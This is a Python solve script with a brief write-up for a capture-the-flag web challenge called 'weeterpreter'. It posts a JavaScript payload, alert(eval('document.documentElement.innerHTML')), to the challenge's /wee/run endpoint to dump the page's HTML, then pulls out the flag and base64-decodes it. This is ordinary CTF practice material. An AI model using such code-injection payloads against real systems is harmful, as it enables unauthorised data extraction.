#!/usr/bin/env python3
import requests
from _env import HOST
import re
import base64

print("""
[Web] - Hard
Inside the weeterpreter,        
     await page.evaluate(`store('${flags.LAYERS}')`)
stores the flag we are after inside a html file.
Using weeterpreter's eval function, we can run any javascript inside this page. 
To return the whole page, we simply call document.documentElement.innerHTML.
To do so from Wee, we need to eval() it.
On top, we have to get it back from the Wee VM somehow. We do that with a simple alert() statement.

in /wee/run, we run:
alert(eval('document.documentElement.innerHTML'))

And get back the Flag:
""")


def run_wee(code):
    r = requests.post("http://{}/wee/run".format(HOST), json={"code": code})
    return r.json()["result"]


code = '''
alert(eval('document.documentElement.innerHTML'))
'''
html = run_wee(code)
# never parse HTML with regex! https://stackoverflow.com/a/1732454/1345238
btoaflag = re.search(r'<div id="[A-Za-z].*">([A-Za-z0-9].*)</div>', html).group(1)

# the flag is base64 encoded (the encoding happens in the slightly obfuscated Javascript)
print(base64.b64decode(btoaflag).decode("utf-8"))

